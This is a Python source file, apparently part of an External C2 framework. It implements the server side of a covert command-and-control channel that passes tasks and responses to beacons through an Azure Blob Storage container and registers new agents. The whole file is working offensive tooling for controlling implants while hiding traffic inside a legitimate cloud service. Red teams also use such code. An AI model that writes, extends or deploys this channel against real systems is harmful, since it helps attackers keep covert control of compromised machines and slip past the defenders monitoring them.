"""
Azure Blob Storage transport for the External C2 server.

Uses the azure-storage-blob SDK to communicate with the client
via an Azure Blob container as the covert channel.

Install dependency:
    pip install azure-storage-blob
"""

from time import sleep
import uuid
from azure.storage.blob import BlobServiceClient

# ── Configuration ────────────────────────────────────────────────────────
# Must match the client-side settings in transport_blob.rs

AZURE_CONNECTION_STRING = "YOUR-AZURE-CONNECTION-STRING"
AZURE_CONTAINER_NAME = "YOUR-AZURE-CONTAINER-NAME"

# ── Key name conventions (must match client) ─────────────────────────────
taskKeyName = "TaskForYou"
respKeyName = "RespForYou"

# ── Internal client ──────────────────────────────────────────────────────
container_client = None


def prepTransport():
    """
    Initialize the Azure Blob container client.
    Called once at server startup.

    Returns:
        int: 0 on success
    """
    global container_client
    blob_service = BlobServiceClient.from_connection_string(AZURE_CONNECTION_STRING)
    container_client = blob_service.get_container_client(AZURE_CONTAINER_NAME)
    # Create the container if it doesn't exist
    try:
        container_client.create_container()
    except Exception:
        pass  # Container already exists
    return 0


def sendData(data, beaconId):
    """
    Send a task to the client via Azure Blob.

    The data has already been encoded by commonUtils.sendData()
    using the configured encoder module.

    Args:
        data (str): Encoded task data
        beaconId (str): UUID of the target beacon

    Blob name pattern: "{beaconId}:TaskForYou:{uuid4}"
    """
    blob_name = "{}:{}:{}".format(beaconId, taskKeyName, str(uuid.uuid4()))
    blob_client = container_client.get_blob_client(blob_name)
    blob_client.upload_blob(data, overwrite=True)


def retrieveData(beaconId):
    """
    Retrieve response data from the client via Azure Blob.
    Blocks/polls until data is available.

    The returned data will be decoded by commonUtils.retrieveData()
    using the configured encoder module.

    Args:
        beaconId (str): UUID of the target beacon

    Returns:
        list: List of raw encoded response messages

    Blob name prefix to look for: "{beaconId}:RespForYou"
    """
    prefix = "{}:{}".format(beaconId, respKeyName)
    while True:
        try:
            blobs = list(container_client.list_blobs(name_starts_with=prefix))
            if blobs:
                responses = []
                for blob in blobs:
                    blob_client = container_client.get_blob_client(blob.name)
                    data = blob_client.download_blob().readall()
                    blob_client.delete_blob()
                    responses.append(data)
                return responses
        except Exception:
            pass
        sleep(5)


def fetchNewBeacons():
    """
    Discover newly registered agents.

    Look for blobs with the "AGENT:" prefix, extract the beacon IDs,
    delete the registration markers, and return the IDs.

    Returns:
        list: List of beacon ID strings (uuid4 format)
    """
    try:
        blobs = list(container_client.list_blobs(name_starts_with="AGENT:"))
        beacons = []
        for blob in blobs:
            if "AGENT:" in blob.name:
                beacon_id = blob.name.split(":")[1]
                print("[+] Discovered new Agent in blob: {}".format(beacon_id))
                # Delete the registration marker
                blob_client = container_client.get_blob_client(blob.name)
                blob_client.delete_blob()
                beacons.append(beacon_id)
        if beacons:
            print("[+] Returning {} beacons for first-time setup.".format(len(beacons)))
        return beacons
    except Exception:
        return []
